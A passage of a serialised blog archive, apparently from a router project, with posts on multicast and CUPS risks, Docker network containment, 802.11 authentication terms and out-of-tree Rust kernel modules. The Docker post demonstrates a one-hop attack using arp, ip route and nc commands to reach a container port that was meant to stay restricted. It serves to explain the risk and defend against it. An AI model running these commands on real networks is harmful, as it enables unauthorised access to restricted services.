benefits of multicast while also being able to constrain the attack surfaces to trusted devices only.","date":"2024-09-26T00:00:00.000Z","tags":[{"inline":true,"label":"firewall","permalink":"/pages/blog/tags/firewall"},{"inline":true,"label":"multicast","permalink":"/pages/blog/tags/multicast"}],"readingTime":3.89,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-and-cups-multicast-vulnerability","title":"Locking Down Multicast Services with SPR","authors":["ltsrad"],"tags":["firewall","multicast"]},"unlisted":false,"prevItem":{"title":"Security Fixes & Conntrack Hardening in SPR","permalink":"/pages/blog/spr-conntrack-hardening"},"nextItem":{"title":"Locking Down Docker Networks with SPR","permalink":"/pages/blog/docker-networking-containment"}},"content":"Here is an overview of how SPR helps defend users against attacks with multicast services. The capabilities let SPR users enjoy the benefits of multicast while also being able to constrain the attack surfaces to trusted devices only.\\n\\n## Overview\\n1. Every WiFi device is placed on its own VLAN and has a unique Group Key blocking Direct Station to Station Multicast traffic\\n2. We employ a configurable multicast proxy to relay whitelisted multicast services. It support mDNS and SSDP by default for ease of use. The multicast proxy and mDNS & SSDP relaying can be completely turned off though.\\n3. We also support [setting a tag for multicast services](/pages/docs/guides/firewall#multicast-proxy) to limit relaying traffic to only devices with the same tag applied.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Understanding Multicast & Risks\\n\\nIP-Based multicast networking allows sending packets to multiple devices with a single packet.\\nIt differs than the broadcast traffic because clients can additionally choose to subscribe to a group and let a router intelligently forward packets to group members, using protocols such as IGMP.\\n\\nMulticast services tend to only be reachable as roughly \'one-hop\' away, meaning an attacker must be network adjacent to a victim to carry out an attack. The packets are one-way, so TCP is not possible but UDP is. Furthermore firewalls can validate that multicast traffic has TTLS set to 1, meaning they won\'t be forwarded.\\n\\nThat said, multicast has been a source of security holes in the past, in Avahi, mDNSResponder, and more recently in CUPS: [where a multicast trigger affected Apple devices, among others](https://github.com/RickdeJager/cupshax/blob/main/cupshax.py);  when users attempt to use maliciously injected printer profiles.\\n\\n## WiFi Group Keys Can Transmit Multicast Without The Access Point\\n\\nOne way to WiFi Clients get Multicast Packets on an encrypted Access Point are directly from other clients with the Group Key that is shared.\\n\\nOr, they can get the packets with unicast, and receive multicast packets when the Access Point intelligently forwards the packets only to the clients that joined the group destination. This method is preferred for maximizing battery life on nearby devices.\\n\\n\\n:::warning\\n\\nCritically, this means that clients can send multicast to one-another without the access point or router bridging/forwarding packets.\\n\\nActually there\'s 3 ways to send a multicast packet to consider.\\n\\n1. Use the shared GTK directly from Client Station to Client Station\\n2. Send to AP. Set the \'DA\' to the victim MAC address and \'RA\' as the Access Point BSSID, for layer 2 bridging. This is the default way stations talk to each other over unicast packets on a subnet without routing. `ap_isolate=` blocks this method.\\n3. Assuming the multicast listener fails to filter for the multicast destination IP: Send to the AP again. This time set the \'DA\' and \'RA\' as the Access Point BSSID and rely on layer 3 IP forwarding to send to the client\'s IP. For UDP this works great but the round trip may not happen unless the peer is on a wired medium. Most consumer WiFi Devices are vulnerable to this in their Guest Network Isolation feature. MAC/IP filtering on the firewall helps stop this.\\n\\n\\n:::\\n\\n## How SPR Performs Multicast Between Client Stations\\n\\nIn hostapd we set the following key features:\\n```\\nper_sta_vif=1 # one vlan per device\\nap_isolate=1 # drop layer 2 bridging\\nmulticast_to_unicast=1 # since each GTK is unique anyway\\n```\\n\\nPart of what makes this all work without losing functionality is that each device is dropped into its own subnet. This means that when devices do want to communicate with one-another they will not expect layer-2 bridging to occur but instead route to each other via layer 3 forwarding.\\n\\nTo re-enable multicast we use a [multicast udp proxy](https://github.com/spr-networks/super/tree/main/multicast_udp_proxy) written in Golang. This will configurabily forward SSDP and mDNS by default.  \\n\\nUsers can [define new services to relay, disable multicast services altogether, or apply a tag](/pages/docs/guides/firewall#multicast-proxy) to filter the multicast to designated clients only.\\n\\n## How SPR Impacts the Recent CUPS Vulnerabilities\\n\\nBy default, SPR has mDNS on. This means that unless a user has turned it off, a malicious device could advertise to [automatically install a malicious foomatic profile](https://github.com/RickdeJager/cupshax/blob/main/cupshax.py#L29).  \\n\\nHowever, unless a victim device is also in the same group as the attacking device, or the victim has a `lan` policy set, the victim will be unable to retrieve the malicious printer profile, blocking the attack.\\n\\n## Multicast Roadmap\\n\\nIn the future we plan to continue to make multicast management more seamless and improve visibility and workflows.\\n\\nOne area of improvement in particular is Wireguard support so that devices can potentially multicast to each other across the VPN if a user chooses the functionality.\\n\\nHave a feature idea or request? [Let us know!](/pages/docs/contact)."},{"id":"docker-networking-containment","metadata":{"permalink":"/pages/blog/docker-networking-containment","source":"@site/blog/2024-09-16-contain-your-container-blast-radius.md","title":"Locking Down Docker Networks with SPR","description":"Envision a homelab scenario with a feature-rich router that\'s suitable as a container host with storage and memory. Locking down the router\'s container network policy is surprisingly difficult to set up and manage.","date":"2024-09-16T00:00:00.000Z","tags":[{"inline":true,"label":"container","permalink":"/pages/blog/tags/container"},{"inline":true,"label":"firewall","permalink":"/pages/blog/tags/firewall"}],"readingTime":7.255,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"docker-networking-containment","title":"Locking Down Docker Networks with SPR","authors":["ltsrad"],"tags":["container","firewall"]},"unlisted":false,"prevItem":{"title":"Locking Down Multicast Services with SPR","permalink":"/pages/blog/spr-and-cups-multicast-vulnerability"},"nextItem":{"title":"Authentication, Association, and Authorization in 802.11 WiFi","permalink":"/pages/blog/80211-authentication-association-authorization-wifi"}},"content":"Envision a homelab scenario with a feature-rich router that\'s suitable as a container host with storage and memory. Locking down the router\'s container network policy is surprisingly difficult to set up and manage.\\n\\nSPR makes it easy with secure by default network controls. Instead of worrying about IP ranges and interfaces,\\njoin the interfaces to the groups of devices they can communicate with and set internet access policy.\\n\\n\x3c!-- truncate --\x3e\\n\\n## First Consider Inbound Access To The Container\\n\\nLet\'s assume the container has a webserver running on a typical port ( 8000), which is exposed to the host network on the same port (8000) in the host network.  But we don\'t want any client device to get access to it, only localhost.\\n\\nOkay so launch docker with an IP to bind on, and set a firewall rule to restrict access right and drop other address inputs? `docker run -p 127.0.0.1:8000:8000 ....`\\n\\nWell it turns out that even if you apply standard rules to drop incoming packets: docker makes it [impossibly hard to actually firewall correctly](https://github.com/moby/moby/issues/22054) when Docker inserts in its own firewall rules. To do this more correctly, [docker recommends inserting rules into the DOCKER-USER chain](https://docs.docker.com/engine/network/packet-filtering-firewalls/). A default-deny policy works best here.  \\n\\n<div>\\n<video width=\\"100%\\" height=\\"100%\\" playsInline controls src=\\"/pages/video/blogs/containers-09-24/docker-firewall-override.mp4\\" type=\\"video/mp4\\">\\n</video>\\n</div>\\n\\nNote that attackers that are only a single-hop away can forward packets to the direct IP of the container and the docker host will forward the traffic, by default. This applies to all docker hosts, by the way, not just hosts that are also routers, for how docker exposes ports. Setting a source address in docker has no impact against one-hop attacks, and if a `DOCKER-USER` chain is applied it must block interfaces with spoofing outright or have some way to authenticate the IP Addresses to be filtered by the firewall.\\n\\n<div>\\n<video width=\\"100%\\" height=\\"100%\\" playsInline controls src=\\"/pages/video/blogs/containers-09-24/one-hop-docker.mp4\\" type=\\"video/mp4\\">\\n</video>\\n</div>\\n\\n\\n<details>\\n<summary>\\nTo better understand how the single hop attacks work, consider the firewall rules docker creates when starting a container with: `docker run -p 192.168.1.2:8000:8000 -it ubuntu bash`. The container has an internal IP on the docker bridge of `172.17.0.2`.\\n\\n</summary>\\n\\n\\n:::info\\n\\n\\nThe rules permissively forward traffic to `172.17.0.2`, from all interfaces, and the host to bind on is mainly for `dnat`. It does not constrain access to the interface the `192.168.1.2` IP belongs to.\\n\\nTo leverage this an attacker one hop away could run something like:\\n```\\n# arp -i wlan1 -s 172.17.0.2 44:44:44:44:44:44 #where 44:44:44:44:44:44 is the MAC ADDR of the docker host\\n# ip route add 172.17.0.2 dev wlan1\\n# nc 172.17.0.2 8000\\nConnection to 172.20.0.2 8000 port [tcp/*] succeeded!\\n\\n```\\n\\nThis also holds true if the container launch had specified ` -p 127.0.0.1:8000:8000`\\n\\nAnd adding an INPUT rule to drop packets on port 8000 does not help either because forwarding is in play,\\nrather than input. The below rule does not block the attack.\\n```\\n# iptables -A INPUT -p tcp --dport 8000 -j DROP\\n# iptables -L\\nChain INPUT (policy ACCEPT)\\ntarget     prot opt source               destination         \\nDROP       tcp  --  anywhere             anywhere             tcp dpt:8000\\n...\\n```\\n\\nAgain, `DOCKER-USER` should be used instead.\\n\\nSee the full rules below for what docker typically establishes\\n```\\n\\nnet.ipv4.conf.all.forwarding=1\\nnet.ipv4.conf.docker0.forwarding=1\\n\\niptables -n -L -v\\nChain INPUT (policy ACCEPT 0 packets, 0 bytes)\\n pkts bytes target     prot opt in     out     source               destination         \\n\\nChain FORWARD (policy DROP 0 packets, 0 bytes)\\n pkts bytes target     prot opt in     out     source               destination         \\n    0     0 DOCKER-USER  0    --  *      *       0.0.0.0/0            0.0.0.0/0           \\n    0     0 DOCKER-ISOLATION-STAGE-1  0    --  *      *       0.0.0.0/0            0.0.0.0/0           \\n    0     0 ACCEPT     0    --  *      docker0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\\n    0     0 DOCKER     0    --  *      docker0  0.0.0.0/0            0.0.0.0/0           \\n    0     0 ACCEPT     0    --  docker0 !docker0  0.0.0.0/0            0.0.0.0/0           \\n    0     0 ACCEPT     0    --  docker0 docker0  0.0.0.0/0            0.0.0.0/0           \\n\\nChain OUTPUT (policy ACCEPT 0 packets, 0 bytes)\\n pkts bytes target     prot opt in     out     source               destination         \\n\\nChain DOCKER (1 references)\\n pkts bytes target     prot opt in     out     source               destination         \\n    0     0 ACCEPT     6    --  !docker0 docker0  0.0.0.0/0            172.17.0.2           tcp dpt:8000\\n\\nChain DOCKER-ISOLATION-STAGE-1 (1 references)\\n pkts bytes target     prot opt in     out     source               destination         \\n    0     0 DOCKER-ISOLATION-STAGE-2  0    --  docker0 !docker0  0.0.0.0/0            0.0.0.0/0           \\n    0     0 RETURN     0    --  *      *       0.0.0.0/0            0.0.0.0/0           \\n\\nChain DOCKER-ISOLATION-STAGE-2 (1 references)\\n pkts bytes target     prot opt in     out     source               destination         \\n    0     0 DROP       0    --  *      docker0  0.0.0.0/0            0.0.0.0/0           \\n    0     0 RETURN     0    --  *      *       0.0.0.0/0            0.0.0.0/0           \\n\\nChain DOCKER-USER (1 references)\\n pkts bytes target     prot opt in     out     source               destination         \\n    0     0 RETURN     0    --  *      *       0.0.0.0/0            0.0.0.0/0  \\n\\n\\niptables -n -L -t nat -v\\nChain PREROUTING (policy ACCEPT 0 packets, 0 bytes)\\npkts bytes target     prot opt in     out     source               destination         \\n 115 19578 DOCKER     0    --  *      *       0.0.0.0/0            0.0.0.0/0            ADDRTYPE match dst-type LOCAL\\n\\nChain INPUT (policy ACCEPT 0 packets, 0 bytes)\\npkts bytes target     prot opt in     out     source               destination         \\n\\nChain OUTPUT (policy ACCEPT 0 packets, 0 bytes)\\npkts bytes target     prot opt in     out     source               destination         \\n   0     0 DOCKER     0    --  *      *       0.0.0.0/0           !127.0.0.0/8          ADDRTYPE match dst-type LOCAL\\n\\nChain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)\\npkts bytes target     prot opt in     out     source               destination         \\n   0     0 MASQUERADE  0    --  *      !docker0  172.17.0.0/16        0.0.0.0/0           \\n   0     0 MASQUERADE  6    --  *      *       172.17.0.2           172.17.0.2           tcp dpt:8000\\n\\nChain DOCKER (2 references)\\npkts bytes target     prot opt in     out     source               destination         \\n   0     0 RETURN     0    --  docker0 *       0.0.0.0/0            0.0.0.0/0           \\n   0     0 DNAT       6    --  !docker0 *       0.0.0.0/0            192.168.1.2          tcp dpt:8000 to:172.17.0.2:8000:::\\n\\n```\\n:::\\n\\n</details>\\n\\n\\n## Next Consider The Container\'s Outbound Access\\n\\nTypically the containers also have unrestricted outbound access. The container would have full network access to all client devices, as well as all of the upstream networks including any private subnets, in addition to DNS and the internet.\\n\\nConsider the following setup. A HomeLab router may be meant for running docker containers, and networking IOT gadgets. Upstream from the HomeLab router is the main router router that handles the trusted network devices. The container would be able to route packets upstream to all devices on the main network too.\\n\\n<div>\\n<video width=\\"100%\\" height=\\"100%\\" playsInline controls src=\\"/pages/video/blogs/containers-09-24/docker-private-upstream.mp4\\" type=\\"video/mp4\\">\\n</video>\\n</div>\\n\\nCustom firewall rules can help here.\\n\\n## Browsers are routers too! (sort of)\\n\\nOne last thing to keep in mind is that, increasingly, browsers are a springboard for breaking into insecure NAS, Routers, and IOT devices. Malicious websites and web-ads can make requests to the internal network to try to compromise devices with default credentials and vulnerabilities.\\n\\nWhen a container is hosted on a router, malicious websites visited by trusted device on the network would be able to potentially access the container too.\\n\\nGoogle\'s Chrome employs [Private Network Access](https://developer.chrome.com/blog/private-network-access-update-2024-03) controls but not all browsers support this hardening. Even then, it\'s not perfect and there are limiting factors to how effective these controls are. See this [ctf challenge which bypasses chrome\'s private network access to exploit a frontier speaker](https://github.com/adc/ctf-midnightsun2022quals-writeups/tree/main/blyatblaster)\\n\\n\\n<div>\\n<video width=\\"100%\\" height=\\"100%\\" playsInline controls src=\\"/pages/video/blogs/containers-09-24/browserspringboard.mp4\\" type=\\"video/mp4\\">\\n</video>\\n</div>\\n\\n\\nIf the Docker Host is reachable from the user\'s device, malicious websites are also able to communicate with any reachable container ports.\\n\\n## How SPR Helps\\n\\nOut of the box: SPR as a router solves these challenges. SPR establishes routing and firewall policy for containers as well as interfaces in general.\\n\\nBy default, containers on the docker bridge only have outbound internet access & DNS. They can not talk to client devices on the network, and furthermore they are blocked from accessing private networks upstream.\\n\\nIf a user wants to set policy for the container to access client devices, they can choose to do so.\\nCreate a docker network bridge for your container service, and use the built-in firewall to set policy.\\nJoin the interface to a group to give it access. Similarly, policy can be set to completely block outbound network access altogether.\\n\\n```\\n#docker-comopse Example\\n\\nnetworks:\\n  containernet:\\n    driver_opts:\\n      com.docker.network.bridge.name: spr-containernet\\n```\\n\\n\\n## How This Makes Integrating Cloud VPNs More Secure\\n\\nWe take advantage of this in our [tailscale integration](https://github.com/spr-networks/spr-tailscale). It\'s possible to connect Tailscale\'s overlay network to your home network with SPR as the bridge with fine grained access control. Policy ensures not all devices on the network see Tailscale devices and vice versa.\\n\\nSPR\'s firewall:\\n1. Prevents the entire tailscale overlay from accessing the local devices without explicit policy, even if tailscale\'s access control is broken or misconfigured\\n2. Prevents the local devices from accessing the tailscale overlay devices without explicit policy\\n\\nNormally this kind of fine grained access control is only possible with devices directly connecting into Tailscale but leveraging SPR it can be enforced by the router\'s firewall policy too.\\n\\n## Looking to use this on SPR?\\n\\nGet started with the interface rules on [SPR see the User Manual\'s Firewall Page](/pages/docs/guides/firewall#custom-interface-access)\\n\\n![firewall-custom-interface-rule-add](/img/guides/firewall-custom-interface-rule-add.png)"},{"id":"80211-authentication-association-authorization-wifi","metadata":{"permalink":"/pages/blog/80211-authentication-association-authorization-wifi","source":"@site/blog/2024-09-06-authentication-association-authorization.md","title":"Authentication, Association, and Authorization in 802.11 WiFi","description":"Association in the 802.11/ WiFi World comes in the \\"loose\\" variety of the term, and why Hostapd disconnect events are confusing...","date":"2024-09-06T00:00:00.000Z","tags":[{"inline":true,"label":"wifi","permalink":"/pages/blog/tags/wifi"},{"inline":true,"label":"authentication","permalink":"/pages/blog/tags/authentication"},{"inline":true,"label":"association","permalink":"/pages/blog/tags/association"},{"inline":true,"label":"authorization","permalink":"/pages/blog/tags/authorization"}],"readingTime":3.715,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"80211-authentication-association-authorization-wifi","title":"Authentication, Association, and Authorization in 802.11 WiFi","authors":["ltsrad"],"tags":["wifi","authentication","association","authorization"]},"unlisted":false,"prevItem":{"title":"Locking Down Docker Networks with SPR","permalink":"/pages/blog/docker-networking-containment"},"nextItem":{"title":"Loading Out of Tree Rust in Linux","permalink":"/pages/blog/loading-your-own-rust-kernel-modules"}},"content":"Association in the 802.11/ WiFi World comes in the \\"loose\\" variety of the term, and why Hostapd disconnect events are confusing...\\n\\nimport Diagram from \'/static/img/aaa-to-handshake.png\'\\n\\n<div style={{display: \\"flex\\", justifyContent: \\"center\\", alignItems: \\"center\\"}}>\\n  <img src={Diagram} style={{width: \\"100%\\"}} />\\n</div>\\n\\nAs a quick recap: when a station connects to an Access Point, it goes through a series of request/reply interactions.\\nSeveral frames are in play including Probes, Authentication, Association, and finally Data frames with EAPOL. The EAPOL payloads perform all the fun cryptography with the passphrase for WPA2, WPA3, and 802.1X Authentication mechanisms.\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n### Association is Not Authentication\\n\\nAs shown in the diagram, the flow has Authentication, Association, and then EAPOL. The Association frames happen before the cryptography is happening with WPA2. Nothing is authenticated at this point. Association lets an Access Point be aware that a Station has associated itself and will begin sending data for the AP to receive.\\n\\n### Authentication is Not Authentication\\n\\nWait a second. Authentication already happened? Why is EAPOL happening?\\n\\nWell it turns out that the Authentication frames for secure wifi today never do authentication, because they only support [insecure cryptography like RC4/WEP](https://www.sciencedirect.com/topics/computer-science/key-authentication) under \\"Shared Key Auth\\". Because the frame format was hard to extend and keep backwards compatible, 802.11 went down the path of going with \\"Open System Auth\\" and handling authentication later.  So today we let WEP rest in the crypt :-)\\n\\n### Authorization Happens With EAPOL\\n\\nSo once the EAPOL 4-way handshake is happy, we have authentication, and the Access Point authorizes the station to send data. All is well. Hostapd will set the `[Authorized]` flag on the station as well to reflect this.\\n\\nThe takeaway here is that when you\'re building a WiFi system, \\"associated\\" stations have not done much more than express an interest in connecting and authenticating. This is convenient for example for knowing if there\'s a station out there that\'s confused.\\n\\nWhen SPR runs as a router, it can alert on WiFi Auth failures -- and it will also warn in the Devices view about stations hanging out that haven\'t authenticated with EAPOL. This helps users debug their wireless environment when something can\'t connect.\\n\\n### What Is A Disconnection in the Ether Anyway?\\n\\nSo we\'ve covered the connection half of these nebulous things in 802.11 named Authentication & Association.\\n\\nBut how does disconnection work? Well devices/APs can send a Deauth / Disassociate frame to let the AP know it\'s leaving. For more details on these check out [Deauthentication Frames Explained](https://www.nzyme.org/knowledge/wifi/deauthentication-frames-explained).\\n\\nBut we have no physical wire. A station is not obligated to send these along, and very often they don\'t, it would be extra packets on the medium to be aggressive about sending these when leaving the environment. The protocol designers are very aware that 802.11 transmission is half-duplex. Only one system can transmit over a channel at a time, and senders have to wait for a transmitter to complete their frame, so skipping these is not a bad thing\\n\\nWhich leads to the next confusing thing:\\n\\n### HostAP Uses Radio Presence for Inactivity\\n\\nActivity in the hostapd world means that when a station\'s MAC address is seen transmitting, it\'s considered active.\\n\\nThis means that a client could remain associated with an AP, even if it\'s connected to a new AP. The disconnect event could then happen long after the station has moved on.\\n\\nTo make this a little smoother, hostapd also provides an option to disconnect sooner.\\n```\\n#\\n# The inactivity polling can be disabled to disconnect stations based on\\n# inactivity timeout so that idle stations are more likely to be disconnected\\n# even if they are still in range of the AP. This can be done by setting\\n# skip_inactivity_poll to 1 (default 0).\\n#skip_inactivity_poll=0\\n```\\n\\nIn our Mesh support -- we can\'t rely on HostAP disconnect events to rewire devices between mesh nodes.\\nInstead we use the authorization to the new Mesh AP to refresh the routing.\\n\\n## Conclusion\\n\\nThis post adds clarity to the confusion in the 802.11 world\'s usage of the terms Authentication, Association, and Authorization. They are not as straightforward as they sound because of the winding history of WiFi Authentication.\\n\\n### Looking to dive into the 802.11 Protocol?\\n\\nCheck out our [Reference WPA2 Access Point in Scapy](https://github.com/spr-networks/barely-ap/blob/main/src/ap.py). It\'s been featured in [Defcon Qualifers](https://github.com/Nautilus-Institute/quals-2023/tree/main/wifi) [and Finals](https://github.com/Nautilus-Institute/finals-2023/tree/main/dron-ap), our [Turtles](https://github.com/spr-networks/turtles-march-2023) challenges, as well as the Midnight Sun CTF. It handles everything needed to let modern devices connect with WPA2 Authentication and send traffic."},{"id":"loading-your-own-rust-kernel-modules","metadata":{"permalink":"/pages/blog/loading-your-own-rust-kernel-modules","source":"@site/blog/2024-08-19-rust.md","title":"Loading Out of Tree Rust in Linux","description":"Rust is taking off in the Linux Kernel and improved support and features make it possible to develop drivers with Rust.","date":"2024-08-19T00:00:00.000Z","tags":[{"inline":true,"label":"rust","permalink":"/pages/blog/tags/rust"},{"inline":true,"label":"kernel","permalink":"/pages/blog/tags/kernel"},{"inline":true,"label":"linux","permalink":"/pages/blog/tags/linux"},{"inline":true,"label":"wifi","permalink":"/pages/blog/tags/wifi"}],"readingTime":9.845,"hasTruncateMarker":true,"authors":[{"name":"Jeremy Goldberger","url":"https://github.com/jgoldberger26","key":"jgoldberger","page":null}],"frontMatter":{"slug":"loading-your-own-rust-kernel-modules","title":"Loading Out of Tree Rust in Linux","authors":["jgoldberger"],"tags":["rust","kernel","linux","wifi"]},"unlisted":false,"prevItem":{"title":"Authentication, Association, and Authorization in 802.11 WiFi","permalink":"/pages/blog/80211-authentication-association-authorization-wifi"},"nextItem":{"title":"BSSID Randomization","permalink":"/pages/blog/bssid-randomization"}},"content":"Rust is [taking off](https://blog.rust-lang.org/2024/08/12/Project-goals.html) in the Linux Kernel and improved support and features make it possible to develop drivers with Rust.\\n\\n\x3c!-- truncate --\x3e\\n\\nIt\'s no secret that C is not a memory-safe language. In the router world, there are [tons of bugs](https://x.com/router_bugs) that surface, many related to memory safety. These bugs are often rooted in low-level device firmware and kernel drivers, making them very dangerous and difficult to work with. Supernetworks is exploring ways of moving wireless protocol parsing out of firmware and drivers and pushing them into userland, with a minimal custom kernel module. Writing this module in Rust would avoid many of the safety pitfalls of C.\\n\\nThe 6.9 Linux release landed Rust support for arm64 which opens the door for us to use Rust for our arm64 based hardware.\\n\\nOne challenge is how to distribute kernel code to users. It\u2019s difficult to maintain a kernel branch so we\u2019d like to explore distributing an out of tree kernel module instead. So when Ubuntu finally lands kernels with Rust for ARM64 (expected to be this year), we\u2019ll be able to distribute a Rust module to load in directly.\\n\\n## TL;DR\\nRust abstractions can be put out of tree with your module, they don\'t need to be compiled in with the kernel. Bindgen still works, since it doesn\'t change the kernel ABI. Helper functions that wrap inlined functions and macros can just be put inside of another external module, and the compiler will figure out the dependency chain.\\n\\n## Out of Tree Modules\\n\\nWith Out of Tree Modules, developers can build Linux Kernel Modules and ship them separately from the loaded Linux kernel build. These modules aren\'t baked into the Linux kernel. Instead, they rely on symbols that the kernel exports to call into kernel code, allowing them to draw on the vast capabilities of the Linux kernel. With Rust, however, calling into the kernel is a little more complicated.\\n\\nOne of the main problems with writing external modules in Rust is that individual subsystems have little built-in support for Rust, as of the time of writing this article. Each subsystem has many functions that drivers can expect to exist in the kernel ABI, but these functions don\'t have Rust abstractions written for them, at least not ones rolled into the kernel. The Linux kernel developers are hopeful that coverage for Rust [abstractions](https://www.kernel.org/doc/html/latest/rust/general-information.html#abstractions) will increase in time, but for now, it is not feasible to write a safe external module for the mainline Linux kernel without these abstractions. To understand how we can use Rust in external kernel modules, let\'s first explore what Rust abstractions are and why they\'re important.\\n\\n## What are abstractions?\\n\\nRust, as a systems programming language, has essentially seamless integration with C through a Foreign Function Interface (FFI). Using the `extern` keyword, Rust can make a call to any C function in the kernel as if it were a normal Rust function, with no changes to the kernel. There is only one notable exception: Memory safety guarantees are dropped.\\n\\nWhen C code is compiled, all functions except for inline functions and macros are given symbols. These symbols are exposed through the Application Binary Interface (ABI), allowing other code to call those functions. The ABI contains information such as parameter types, return types, and more, but no information about memory safety. If we want to use Rust\'s memory safety model, we need to specify these guarantees ourselves, with Rust code. By writing abstraction layers around FFI calls, we can manually define what Rust should expect regarding memory safety. Take this example, based on a similar one from [The Rust Book](https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html#using-extern-functions-to-call-external-code):\\n\\n```C\\nint c_abs(int num) {\\n\\treturn abs(num);\\n}\\n// EXPORT_SYMBOL_GPL(c_abs);\\n\\nvoid c_abs_in_place(int* num) {\\n\\t*num = abs(*num);\\n}\\n// EXPORT_SYMBOL_GPL(c_abs_in_place);\\n```\\n\\n```Rust\\nextern \\"C\\" {\\n\\t// Define our extern functions. This doesn\'t compile to anything, it just\\n\\t// tells Rust to expect that it will be able to use these functions with\\n\\t// these symbols\\n\\tfn c_abs(num: i32) -> i32;\\n\\t// Note that \'mut\' isn\'t strictly required. Omitting it would still compile,\\n\\t// but it would break Rust\'s memory safety guarantees, allowing the programmer\\n\\t// to make a mistake.\\n\\tfn c_abs_in_place(num: *mut i32);\\n}\\n\\n// We wrap the FFI call in an abstraction, so that we can isolate the unsafe call\\n// here. If we didn\'t have this, we would have to use unsafe in our main function,\\n// which would make it hard to figure out where memory safety bugs happen.\\nfn rust_abs(num: i32) -> i32 {\\n\\t// SAFETY: This is just an FFI call.\\n\\tunsafe { c_abs(num) }\\n}\\n\\nfn rust_abs_in_place(num: &mut i32) {\\n\\t// SAFETY: Since num is a reference, we know its pointer is still valid.\\n\\t// Otherwise, this is just an FFI call.\\n\\tunsafe { c_abs_in_place(num as *mut i32) }\\n}\\n\\nfn main() {\\n\\t// Since we used safe abstractions, we don\'t need to use unsafe code\\n\\t// in our main function.\\n\\tlet foo = rust_abs(-5);\\n\\tlet mut bar = -5;\\n\\trust_abs_in_place(&mut bar); // Note that rust forces us to use mut because\\n\\t\\t\\t\\t\\t\\t\\t\\t // of how we defined our safe wrapper.\\n\\tprintln!(\\"Foo is {} and bar is {}!\\", foo, bar);\\n\\t\\t   // Foo is 5 and bar is 5!\\n}\\n```\\n\\nSince abstractions are wrappers around essential subsystem functions, they would normally be rolled into the kernel so any driver could access them. That way, each C subsystem function only needs to be wrapped once. Any module or driver, out-of-tree or not, could then use them without having to rewrite the abstraction for every single driver.\\n\\nAs we saw before, abstractions are just normal Rust code that wraps an `unsafe` function. So, what\'s the problem with just moving it out-of-tree and putting it with your other code? There\'s none, it really is that easy! While abstractions solve most of our issues, there are some issues that it doesn\'t solve. To understand why, let\'s look at bindgen and how it works.\\n\\n## Why Bindgen isn\'t a problem\\n\\nAs the name implies, bindgen automatically generates bindings for Rust code. These bindings are the same as the `extern` block above, only a lot more complicated. The only confusion is that bindgen must be compiled with the kernel, but it doesn\'t change the ABI. The only things that go in the `extern` block are definitions: function prototypes, constants, and structure definitions that don\'t compile to anything. Instead, in the case of function prototypes, they\'re used by the Rust compiler to place symbols. When the linker links all the object files together, it will find the C function symbols that were exposed by bindgen, and call it from Rust. Bindgen doesn\'t create anything new; it just exposes existing symbols to Rust.\\n\\nNow, can call into any exported symbol that exists in the C kernel. But there is one more challenge: Handling macros and inline functions in our Rust modules.\\n\\n## Macros and Inlines\\n\\nMacros and inline functions are different from regular functions in that they don\'t get assigned a symbol. Instead, they are directly inserted during pre-processing or compilation. These functions aren\'t in the kernel ABI, so we don\'t have any way to access them from Rust!\\n\\nThe way this is normally handled in the kernel is by generating helper functions, like this:\\n\\n```C\\nvoid rust_helper_mutex_lock(struct mutex *lock)\\n{\\n    mutex_lock(lock);\\n}\\nEXPORT_SYMBOL_GPL(rust_helper_mutex_lock);\\n```\\n\\nEach of these helper functions is compiled into the kernel and given a symbol so that they can be used from Rust. This is convenient for making use of commonly used macros and inline functions from multiple places. However, our focus is on distributing the external module without having to distribute a kernel as well. Since these helper functions generate symbols that would not be present in the mainline kernel, running our driver would require a custom kernel.\\n\\nTo generate these symbols externally, we must write our own helpers with our external module. Unlike abstractions, these helpers aren\'t just more Rust code. They\'re C code that needs to be compiled first. We can compile these helper functions using another external module.\\n\\n## Depending on an external module\\n\\nBy simply writing these functions in a C file and specifying it as a module, we can generate symbols for C functions. Then, by compiling both the Rust and C modules together, the Linux kernel\'s build system will automatically figure out that the Rust module depends on the C helper module!\\n\\n```C\\n// SPDX-License-Identifier: GPL-2.0\\n\\n\\n#include <linux/module.h>\\n#include <linux/kernel.h>\\n#include <linux/version.h>\\n\\nint linux_version_code(void);\\nint linux_version_code(void) {\\n\\t// We can\'t access LINUX_VERSION_CODE in Rust because it\'s defined\\n\\t// using #define. This helper function exports it to rust. This\\n\\t// works with macros and inline functions as well.\\n    return LINUX_VERSION_CODE;\\n}\\nEXPORT_SYMBOL_GPL(linux_version_code);\\n\\nMODULE_LICENSE(\\"GPL\\");\\nMODULE_AUTHOR(\\"Jeremy Goldberger\\");\\nMODULE_DESCRIPTION(\\"A simple helper module.\\");\\n```\\n\\n```Rust\\n// SPDX-License-Identifier: GPL-2.0\\n\\n//! Inspired by Rust hello world example by Adrea Righi\\n\\nuse kernel::prelude::*;\\n\\nmodule! {\\n    type: ModuleExample,\\n    name: \\"oot_example\\",\\n    author: \\"Jeremy Goldberger\\",\\n    description: \\"Rust external module example\\",\\n    license: \\"GPL\\",\\n}\\n\\nstruct ModuleExample {\\n}\\n\\nimpl kernel::Module for ModuleExample {\\n    fn init(_module: &\'static ThisModule) -> Result<Self> {\\n        pr_info!(\\"Hello from Rust\\\\n\\");\\n        pr_info!(\\"The current time according to C is {}.\\\\n\\", rust_ktime_get());\\n        pr_info!(\\"The current linux version according to C is {}.\\\\n\\", rust_linux_version_code());\\n        Ok(ModuleExample { })\\n    }\\n}\\n\\nfn rust_ktime_get() -> i64 {\\n    // Note that we don\'t need to define ktime_get() in an extern block anywhere;\\n    // it was already done in bindgen! Even if it wasn\'t, we could add whatever\\n    // header we wanted to bindings_helper, and we could use it without messing\\n    // up the kernel ABI.\\n    unsafe { kernel::bindings::ktime_get() }\\n}\\n\\nextern \\"C\\" {\\n    // We define this extern block ourselves. Because it\'s a helper function\\n    // that doesn\'t exist in the Linux kernel, bindgen wouldn\'t be able\\n    // to generate 